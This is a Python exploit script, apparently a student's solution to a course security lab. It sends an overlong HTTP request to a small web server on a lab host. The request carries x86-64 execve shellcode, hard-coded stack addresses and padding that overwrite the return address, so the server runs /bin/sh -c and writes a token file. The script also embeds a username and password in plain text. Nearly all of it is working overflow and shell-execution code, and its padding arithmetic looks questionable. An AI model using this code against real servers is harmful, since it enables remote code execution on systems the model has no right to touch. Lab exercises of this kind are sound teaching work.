import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET"

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

PORT = random.randint(10000, 10025)


USER = b"jnyamiak"
PASSWORD = b"36bb44bb7c"

# These are the arguments that make up the shell script we want to execve.
# Don't forget that there needs to be a NULL pointer as the last argument in addition to these!
SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"echo -n \"" + USER + b"\" | sha384sum > /hackme/tiny/tokens/" + PASSWORD + b"\x00"]
NULL_ARRAY = b"\x00"


# Code that exploits buffer overflow
EXPLOIT = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8b\x3c\x25\xc9\x55\x58\x58\x48\x8b\x34\x25\xd1\x55\x58\x58\x48\x8b\x14\x25\x14\x56\x58\x58\x0f\x05"

# Start of Garbage Array where EXPLOIT code is
BUFFER_START = 0x58585590
ADDRESS = to_bytes(BUFFER_START)

FILENAME_ADDRESS = to_bytes(BUFFER_START + len(EXPLOIT))
ARGV_ADDRESS = to_bytes(BUFFER_START + len(EXPLOIT) + len(SCRIPT[0]))
ENVP_ADDRESS = to_bytes(BUFFER_START + len(EXPLOIT) + len(SCRIPT[0]) \
 + len(SCRIPT[1]) + len(SCRIPT[2]))


# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)
N = 1008 - len(EXPLOIT) + len(FILENAME_ADDRESS) + len(ARGV_ADDRESS) + len(ENVP_ADDRESS) \
 + len(SCRIPT[0]) + len(SCRIPT[1]) + len(SCRIPT[2]) + len(NULL_ARRAY)
PADDING = b"\xff" * N

# The "exploit string" is what we send in as the headers
HEADERS = EXPLOIT + SCRIPT[0] + SCRIPT[1] + SCRIPT[2] + NULL_ARRAY \
 + FILENAME_ADDRESS + ARGV_ADDRESS + ENVP_ADDRESS + PADDING + ADDRESS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b" HTTP/1.1\r\n" + HEADERS + b"\r\n\r\n" + PASSWORD
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
